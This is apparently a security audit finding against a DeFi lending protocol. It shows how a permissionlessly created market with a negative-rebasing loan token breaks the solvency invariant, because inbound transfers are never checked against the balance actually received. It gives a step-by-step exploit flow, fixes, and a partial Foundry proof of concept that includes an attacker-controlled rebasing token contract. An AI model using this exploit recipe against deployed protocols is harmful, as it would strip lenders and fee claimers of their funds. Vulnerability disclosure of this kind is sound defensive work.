### Title
Negative-Rebasing Loan Token Breaks Solvency Invariant via Missing Balance-Delta Verification in `safeTransferFrom` - (File: src/libraries/SafeTransferLib.sol)

### Summary
`SafeTransferLib.safeTransferFrom` verifies only call success and return value, never the actual balance delta received by the contract. Because `touchMarket` imposes no restriction on the loan token type, an unprivileged market creator can deploy a negative-rebasing ERC20 as the loan token. After credit and withdrawable state are established, triggering a negative rebase silently reduces `balanceOf(midnight, loanToken)` while `withdrawable` and `claimableSettlementFee` remain unchanged, making their sum exceed the contract's actual balance and rendering full withdrawal impossible.

### Finding Description

**Root cause — `SafeTransferLib.safeTransferFrom` (lines 24–34):**

```solidity
function safeTransferFrom(address token, address from, address to, uint256 value) internal {
    require(token.code.length > 0, NoCode());
    (bool success, bytes memory returndata) =
        token.call(abi.encodeCall(IERC20.transferFrom, (from, to, value)));
    ...
    require(returndata.length == 0 || abi.decode(returndata, (bool)), TransferFromReturnedFalse());
}
```

No `balanceOf(address(this))` snapshot is taken before or after the call. The function accepts any transfer that does not revert and does not return `false`.

**Permissionless market creation — `touchMarket` (lines 755–791):**

`touchMarket` validates collateral params, LLTV, and maturity, but places **no restriction on `market.loanToken`**. Any address with deployed code is accepted. An unprivileged caller can create a market whose loan token is a contract they control.

**Accounting increment without delta verification — `repay` (lines 508–520):**

```solidity
position[id][onBehalf].debt -= UtilsLib.toUint128(units);
marketState[id].withdrawable += UtilsLib.toUint128(units);   // line 509
...
SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units); // line 520
```

`withdrawable` is incremented by the nominal `units` value. The transfer call at line 520 is never checked against an actual balance delta. The same pattern applies to `claimableSettlementFee` in `take` (line 418) and the corresponding `safeTransferFrom` at line 455.

**Formal verification explicitly excludes rebasing tokens — `Solvency.spec` (line 31):**

```
// Assume ERC20 tokens transfer correctly: no fee taking from sender or receiver,
// no rebasing, no blacklisting, no transfer limits.
```

The `tokenBalanceCorrect` strong invariant (lines 162–163) is therefore not proven for rebasing tokens. The project's own `live_context.json` (line 233) lists "rebasing… should be tested if not explicitly excluded" as an open concern, confirming no on-chain exclusion exists.

**Exploit flow:**

1. Attacker deploys `NegativeRebaseToken` — a standard ERC20 with an owner-callable `rebase(uint256 pct)` that multiplies every balance by `(WAD - pct) / WAD`.
2. Attacker calls `midnight.touchMarket(market)` with `market.loanToken = address(NegativeRebaseToken)`. No check blocks this.
3. Lender takes a buy offer; borrower takes a sell offer. Borrower now has `debt = D`, lender has `credit = D`.
4. Borrower calls `repay(market, D, ...)`. At line 509, `withdrawable += D`. At line 520, `safeTransferFrom` pulls `D` tokens. Contract balance = `D`. Invariant holds.
5. Settlement fee spread from `take` means `claimableSettlementFee[loanToken] = F > 0`.
6. Attacker calls `NegativeRebaseToken.rebase(X)`. Every balance, including `balanceOf(midnight)`, drops by `X%`. Contract balance becomes `D * (1 - X/100)`.
7. `withdrawable + claimableSettlementFee = D + F > D * (1 - X/100) = balanceOf(midnight, loanToken)`. Solvency invariant violated.
8. The first lender to call `withdraw` drains the remaining balance; subsequent lenders and the fee claimer receive zero.

### Impact Explanation

The solvency invariant `balanceOf(midnight, loanToken) >= withdrawableSum + claimableSettlementFee` is concretely violated. Lenders whose `credit` maps to `withdrawable` units and the fee claimer whose `claimableSettlementFee` is non-zero cannot fully redeem their entitlements. The shortfall is permanent and proportional to the rebase magnitude and the total outstanding withdrawable plus fee balance. This is direct, irreversible insolvency for the affected market.

### Likelihood Explanation

**Preconditions:**
- Attacker deploys a negative-rebasing ERC20 (trivial, ~50 lines of Solidity).
- Attacker calls `touchMarket` (permissionless, no cost beyond gas).
- At least one repayment or settlement-fee-generating `take` must have occurred to build up `withdrawable` or `claimableSettlementFee`. The attacker can be both lender and borrower in the same market to self-fund this state.
- Attacker triggers `rebase()` (one transaction).

The attack is fully self-contained, requires no privileged access, no oracle manipulation, and no victim cooperation beyond the initial market interaction. It is repeatable across any number of markets. The only friction is that the attacker must attract real lenders to cause meaningful harm to third parties; harming only themselves is trivially achievable.

### Recommendation

1. **Add a balance-delta check in `safeTransferFrom` call sites** (or in a wrapper used by `repay`, `take`, `supplyCollateral`, `liquidate`, and `flashLoan`): snapshot `balanceOf(address(this))` before and after each inbound transfer and require the delta equals the expected `value`.
2. **Alternatively, maintain a per-token `internalBalance` mapping** that is incremented only by the verified delta and used as the authoritative source for solvency accounting instead of the nominal `units` value.
3. **Document and enforce the token restriction on-chain**: if rebasing tokens are out of scope by design, add a registry or a per-token flag that `touchMarket` checks before accepting a `loanToken`, so the exclusion is enforced at the contract level rather than only in the Certora spec assumption.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market, Offer, CollateralParams} from "src/Midnight.sol";

contract NegativeRebaseToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external { balanceOf[to] += amt; totalSupply += amt; }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; return true; }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function transferFrom(address fr, address to, uint256 amt) external returns (bool) {
        allowance[fr][msg.sender] -= amt; balanceOf[fr] -= amt; balanceOf[to] += amt; return true;
    }
    // Negative rebase: reduce every tracked balance by pct/1e18
    function rebase(address[] calldata holders, uint256 pct) external {
        for (uint i; i < holders.length; i++) {
            balanceOf[holders[i]] = balanceOf[holders[i]] * (1e18 - pct) / 1e18;
        }
    }
}

contract RebaseInsolvencyTest is Test {
    Midnight midnight;
    NegativeRebaseToken token;

    function testNegativeRebaseBreaksSolvency() public {
        // Setup: deploy Midnight, create market with rebasing loan token
        token = new NegativeRebaseToken();
        // ... (standard market setup with collateral params, oracle, etc.)

        // Step 1: lender supplies credit, borrower takes debt
        uint256 units = 1_000e18;
        token.mint(address(lender), units);
        // take() → lender credit = units, borrower debt = units

        // Step 2: borrower repays → withdrawable = units, balance = units
        token.mint(address(borrower), units);
        // repay(market, units, borrower, address(0), "")
        uint256 withdrawableBefore = midnight.withdrawable(id);
        assertEq(withdrawableBefore, units);
        assertEq(token.balanceOf(address(midnight)), units);

        // Step 3: trigger 50% negative rebase
        address[] memory holders = new address[](1);
        holders[0] = address(midnight);
        token.rebase(holders, 0.5e18); // 50% reduction

        // Step 4: assert solvency invariant is broken
        uint256 balance = token.balanceOf(address(midnight));
        uint256 withdrawableAfter = midnight.withdrawable(id);
        uint256 claimableFee = midnight.claimableSettlementFee(address(token));

        assertLt(balance, withdrawableAfter + claimableFee,
            "INVARIANT BROKEN: balance < withdrawable + claimableSettlementFee");

        // Step 5: first lender withdraws all remaining balance; second lender gets nothing
        // withdraw(market, withdrawableAfter, lender, lender) → succeeds, drains balance
        // withdraw(market, ..., otherLender, otherLender) → reverts (insufficient balance)
    }
}
```

- `token.balanceOf(address(midnight)) < midnight.withdrawable(id) + midnight.claimableSettlementFee(address(token))` — invariant broken post-rebase.
- Second `withdraw` call reverts with an ERC20 transfer failure (underflow), confirming lender insolvency.
